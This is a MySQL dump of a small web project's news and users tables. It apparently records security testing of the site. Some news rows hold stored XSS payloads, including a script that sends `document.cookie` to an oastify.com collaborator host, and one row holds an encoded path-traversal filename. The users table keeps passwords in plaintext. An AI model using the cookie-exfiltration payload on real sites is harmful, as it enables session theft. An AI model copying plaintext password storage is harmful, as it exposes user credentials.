-- MySQL dump 10.13  Distrib 8.0.31, for Linux (x86_64)
--
-- Host: localhost    Database: webproject
-- ------------------------------------------------------
-- Server version	8.0.31-0ubuntu0.22.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `news` (
  `id` int NOT NULL AUTO_INCREMENT,
  `id_user` int DEFAULT NULL,
  `title` text,
  `content` text,
  `image` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_id` (`id_user`),
  CONSTRAINT `FK_id` FOREIGN KEY (`id_user`) REFERENCES `users` (`id_user`)
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
INSERT INTO `news` VALUES (1,1,'Hacked','hacked','1 (1).jpg'),(3,1,'Test','1234',NULL),(4,1,'Test2','1234',NULL),(11,2,'test','1234',NULL),(12,2,'Hà Nội: Hàng trăm học sinh bất ngờ bị chuyển trường để lên chuẩn quốc gia','ok',NULL),(13,1,'post admin','ok',NULL),(14,14,'Haha','ok',NULL),(15,1,'admin post','03102002',NULL),(16,16,'test test','03102002',NULL),(18,1,'Thế &quot;tiến thoái lưỡng nan&quot; của Ukraine khi phản công Nga ở miền Nam','haha',NULL),(20,19,'hello','<script>alert()</script>',NULL),(21,19,'hello','<script>alert()</script>',NULL),(22,19,'hello','<script>alert(1)</script>',NULL),(23,19,'123','<script> fetch(\'https://aky3s906uf14694pmnq2v1x59wfo3d.oastify.com\', { method: \'POST\', mode: \'no-cors\', body:document.cookie});</script>',NULL),(24,19,'test update','test','burp-suite-professional-icon-clr-50.png'),(32,19,'testupload','admin','/view/imgPost/cat.jpg'),(33,19,'test','test','/view/imgPost/adf1ad9a51e894b6cdf9.jpg'),(34,19,'toandhdd','dhdhjdhjd','Screenshot 2021-12-04 122342.png'),(35,19,'fjdjf','toandhhdhdhdd','Screenshot 2021-12-04 122342.png'),(38,19,'test','abc','hacked.jpg'),(42,21,'','','a.png'),(43,21,'','',''),(44,21,'','','a.png'),(45,21,'','','a.png'),(46,21,'','','da.png'),(47,21,'','','%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%2e%70%6e%67'),(48,21,'','','da.png'),(50,19,'&lt;script&gt;alert()&lt;/script&gt;','test','hacked.jpg'),(51,1,'admin','admin\r\n',''),(52,23,'User han che','chỉ được xem, không được sửa','');
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id_user` int NOT NULL AUTO_INCREMENT,
  `username` char(20) NOT NULL,
  `name` varchar(30) DEFAULT NULL,
  `password` char(20) NOT NULL,
  `token` varchar(50) DEFAULT NULL,
  `role` int DEFAULT '0',
  `status` char(15) DEFAULT 'enable',
  `verify` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id_user`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin','Admin','03102002','',1,'enable',''),(2,'hackedd','edit123','123456','',1,'enable',NULL),(4,'user2','Phạm Tiến Duy','test',NULL,0,'disable',NULL),(5,'nh02','Nguyen Huong','03102002','',0,'enable',NULL),(12,'user7','user7','03102002',NULL,0,'enable',NULL),(13,'admin2','admin2','03102002',NULL,1,'enable',NULL),(14,'test','Pham Duy','03102002',NULL,0,'disable',NULL),(15,'test2','Phạm Tiến Duy','03102002','user6318bf00ee6803.29396120',0,'enable',NULL),(16,'user8','Phạm Tiến Duy','03102002','',0,'enable',NULL),(18,'user10','Phạm Tiến Duy','03102002','',0,'enable',NULL),(19,'hacked','hacked','03102002','',0,'enable',''),(21,'ducanh','anh','123',NULL,0,'enable',NULL),(23,'userhanche','UserHanChe','03102002',NULL,2,'enable','verify637bcd89348a52.55633407');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-02-21 16:08:45
